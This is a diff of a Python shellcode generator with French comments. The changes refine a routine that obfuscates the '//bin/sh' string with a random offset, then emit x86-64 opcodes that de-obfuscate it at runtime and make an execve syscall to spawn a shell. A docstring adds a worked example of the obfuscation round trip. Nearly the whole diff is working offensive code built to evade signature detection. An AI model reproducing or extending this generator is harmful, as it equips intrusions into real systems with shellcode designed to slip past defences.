@@ -108,28 +108,38 @@ def factorOffus(string4Payload):
 
     return rand
 
-#Le "main" de l'offuscation, on va utiliser la valeur alétaoire et l'additionner à toutes les valeur par tanches de deux de la string en hexa
+#Le "main" de l'offuscation, on va utiliser le retour de la fonction factorOffus 
+# et l'additionner à toutes les valeurs par tanches de deux octets de la string d'hexa
 def offus(string4Payload, rand):
     #On recinstitue une nouvelle chaine en hexa
-    newString = "" #"0x"
+    newString = ""
 
     #Vérifie s'il n'y a pas "0x" au debut de la string
-   # if string4Payload[0]+string4Payload[1] != "0x" :
-    #    string4Payload = "0x"+string4Payload
-
+    if string4Payload[0]+string4Payload[1] != "0x" :
+        string4Payload = "0x"+string4Payload
+    
     #On boucle sur l'addition/soustraction avec notre coefficient pour obtenir notre nouvelle string
     for i in range(2,len(string4Payload),2):
+
+        if string4Payload[i] + string4Payload[i+1] == "0x" :
+            continue
         
-        #Récupère la valeur hexa pour l'occurence en cours
-        sub = string4Payload[i] + string4Payload[i+1]
-        #Ajout la valeur random à la valeur (résultat en décimal)
-        numInDec = int(sub,16) + rand
-        #Convertit en hexa
-        numInHex = hex(numInDec)
-        #numInHex = "0xXX" donc on récupère que la valeur XX
-        newString = newString + str(numInHex[-2:])
+        else :
+            #Récupère la valeur hexa pour l'occurence en cours
+            sub = string4Payload[i] + string4Payload[i+1]
+            #Ajout la valeur random à la valeur (résultat en décimal)
+            numInDec = int(sub,16) + rand
+            #Convertit en hexa
+            numInHex = hex(numInDec)
+
+            #La fonction hex ecrit 2 en hexa => 0x2 et pas 0x02 donc on vérifie
+            if len(str(numInHex)) > 3:
+                newString = newString + str(numInHex[-2:])
+            else :
+                newString = newString + "0" + str(numInHex[-1:])
     
     return newString
+
 
 #Renvoit l'opcode pour soustraire ou additionnner ce qui rend la désoffuscation possible
 def deOffus(factorOffusVar, string_to_deof):
@@ -392,15 +402,8 @@ def shell():
     #Inverse en mirroir tout la chaine pour op code
     offuString = offuString[::-1]
 
-    PAYLOAD += "48bb"  #mov rbx, ...
-    '''
-    for i in range(0,15,2):
-        sub = offuString[i+1] + offuString[i] 
-        PAYLOAD+= sub
-    PAYLOAD+=offuString
-    '''
-                    #.../bin/bash en hexa offusqué    
-    
+    PAYLOAD += "48bb"       #mov rbx, ...
+    PAYLOAD+=offuString     #.../bin/bash format hexa, offusqué
     #Déoffucation
     PAYLOAD += deOffus(factorOffusVar, "0x68732f6e69622f2f") 
 
@@ -413,6 +416,22 @@ def shell():
     PAYLOAD+="b03b" #mov al, 0x3b
     PAYLOAD+= call()
 
+"""
+EXEMPLE EXECUTION OFFUSCATION DESOFFUSCATION :
+
+random1 = factorOffus("0x68732f6e69622f2f") #Marche avec n'importe quelle string en hexa avec 0x ou non
+of_string = offus("0x68732f6e69622f2f", random1)
+of_string = of_string[::-1] #litle indian
+of_string += "48bb"
+deof_string = deOffus(random1, of_string)
+        
+print("FINAL : 0x68732f6e69622f2f", random1, of_string, deof_string)
+
+FIN EXEMPLE
+"""
+
+
+""" C'est quoi cette ... chose ????????????????????????????????????????
 def deof_shell():
     global PAYLOAD
     #String d'accueil offusquée 
@@ -452,11 +471,7 @@ def deof_shell():
     #Appel systeme
     PAYLOAD+="b03b" #mov al, 0x3b
     PAYLOAD+= call()
-    
-        
-    
-    
-        
+"""    
     
 def _exit():
     global PAYLOAD
